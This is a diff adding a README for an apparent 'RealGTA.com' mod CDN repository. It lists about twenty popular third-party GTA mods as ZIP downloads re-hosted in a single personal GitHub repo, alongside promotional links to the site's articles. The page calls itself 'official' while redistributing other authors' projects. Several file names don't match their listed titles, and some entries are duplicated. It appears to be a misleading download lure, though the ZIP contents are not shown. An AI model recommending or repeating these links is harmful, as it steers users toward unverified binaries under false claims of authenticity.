@@ -1,0 +1,32 @@
+# 🕹️ RealGTA.com — Official GTA Mods & Performance Configs CDN (`realgta-mods-cdn`)
+
+Official open-source mirror and package index for **[RealGTA.com Mods Hub](https://realgta.com/mods)**.
+
+## 🔗 Official Portal & Technical Guides
+- **Main Mods Catalog (120+ Verified Mods):** [https://realgta.com/mods](https://realgta.com/mods)
+- **Fix `ERR_GFX_D3D_INIT` & `gameconfig.xml` Crashes:** [Read Guide on RealGTA.com](https://realgta.com/articles/how-to-fix-err-gfx-d3d-init-and-gameconfig-crash-gta-5)
+- **Fix RAGE Engine 188 FPS Cap Stutter:** [Read Technical Breakdown](https://realgta.com/articles/why-does-gta-5-stutter-at-high-fps)
+- **Confirmed GTA VI Vehicles & Leonida Map Analysis:** [Explore GTA 6 Dossiers](https://realgta.com/articles/confirmed-vehicles-in-gta-6-list)
+
+## 📦 Included Packages (`/packages`)
+- **Leonida Vice 6 LUT & Reshade Pack v1.2** (`GTA V / VI Concept`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/leonida-vice-6-lut-pack-v1.2.zip)
+- **RAGE Engine High-FPS Stutter Fix (188 FPS Cap Patch) v2.0** (`GTA V`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/rage-high-fps-stutter-fix-v2.0.zip)
+- **F7YO Gameconfig.xml (v3351+) — 1,500+ Add-On Vehicles Pool** (`GTA V`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/gameconfig-3095-unlimited-addon-pool.zip)
+- **GTA VI Leonida Neon Radar & HUD Overhaul v1.0** (`GTA V`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/leonida-hud-radar-overhaul-v1.0.zip)
+- **open.mp (SA-MP Backward-Compatible Multiplayer Server & Client v1.2)** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/san-andreas-coop-storyline-synchronizer-asi-v3-2.zip)
+- **Project2DFX v4.4 — Extended Draw Distance & Corona LodLights** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/project2dfx-extended-draw-distance-lodlights.zip)
+- **Multi Theft Auto: San Andreas (MTA:SA v1.6) Open-Source Engine** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/multi-theft-auto-san-andreas-mtasa-v1-6.zip)
+- **F7YO Gameconfig.xml (v3351+) — Support for 1,500+ Add-On Vehicles & DLCs** (`GTA V`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/f7yo-gameconfig-xml-v3351-unlimited-addon-vehicles.zip)
+- **GTA IV & EFLC FusionFix + DXVK Vulkan Overhaul v3.1 (ThirteenAG)** (`GTA IV`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/gta-iv-dxvk-rtx-remix-path-tracing-wrapper-v1-9.zip)
+- **SkyGfx v4.2b — Accurate PS2 Radiosity & Neon Lighting Shaders** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/skygfx-ps2-radiosity-neon-lighting-shaders.zip)
+- **GTA SA Rainbomizer v3.1 — Complete Mission, Traffic, Cutscene & Voice Randomizer** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/gta-sa-rainbomizer-mission-traffic-cutscene-randomizer.zip)
+- **DXVK Async Vulkan Wrapper v2.4.1 for GTA IV Complete Edition (2x FPS Boost)** (`GTA IV`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/dxvk-async-vulkan-wrapper-v2-4-1-gta-iv-fps-boost.zip)
+- **SilentPatch for GTA III, Vice City & San Andreas (CookiePLMonster)** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/silentpatch-gta-iii-vc-sa-official.zip)
+- **Menyoo PC v2.0 — Director Mode, Object Spooner & Vehicle Customizer** (`GTA V`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/menyoo-pc-director-mode-object-spooner.zip)
+- **Grinch_ Cheat Menu v3.4 — ImGui Visual Trainer for SA / VC / III** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/grinch-cheat-menu-imgui-visual-trainer-sa-vc-iii.zip)
+- **Community Script Hook V .NET (ScriptHookVDotNet v3.6.0)** (`GTA V`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/scripthookvdotnet-community-runtime-v3-6-0.zip)
+- **Chaos Mod V v2.2 — 350+ Real-Time Random Effect Triggers (GitHub Official)** (`GTA V`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/chaos-mod-v-realtime-random-effects-script.zip)
+- **Ultimate ASI Loader v8.0 (dinput8.dll / vorbisFile.dll Universal Wrapper)** (`GTA III`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/ultimate-asi-loader-thirteenag-universal-wrapper.zip)
+- **CLEO Redux v1.1.4 — Modern JS & SCM Scripting Runtime** (`GTA VC`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/cleo-redux-modern-js-scm-runtime.zip)
+- **Mod Loader v0.3.8 for GTA III, Vice City & San Andreas (Link2012)** (`GTA SA`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/mod-loader-link2012-gta-iii-vc-sa.zip)
+- **GTA III Classic Axis — Third-Person Right-Stick Camera & Modern Aiming** (`GTA III`) — [Download ZIP](https://raw.githubusercontent.com/harutyunian/realgta-mods-cdn/main/packages/gta-iii-classic-axis-modern-camera-aiming-overhaul.zip)
